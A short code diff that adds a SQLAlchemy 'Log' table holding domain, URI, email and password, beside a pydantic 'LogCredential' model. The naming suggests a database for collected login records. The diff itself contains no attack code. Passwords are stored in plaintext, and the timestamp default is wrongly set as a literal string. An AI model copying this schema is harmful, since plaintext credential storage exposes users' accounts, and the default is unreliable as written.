@@ -1,5 +1,18 @@
 from typing import List
 from pydantic import BaseModel, Field
+from sqlalchemy import Column, Integer, String, TIMESTAMP
+from sqlalchemy.ext.declarative import declarative_base
+
+Base = declarative_base()
+
+class Log(Base):
+    __tablename__ = "logs"
+    id = Column(Integer, primary_key=True, index=True)
+    domain = Column(String, nullable=False)
+    uri = Column(String, nullable=False)
+    email = Column(String)
+    password = Column(String)
+    created_at = Column(TIMESTAMP, default="CURRENT_TIMESTAMP")
 
 class LogCredential(BaseModel):
     """
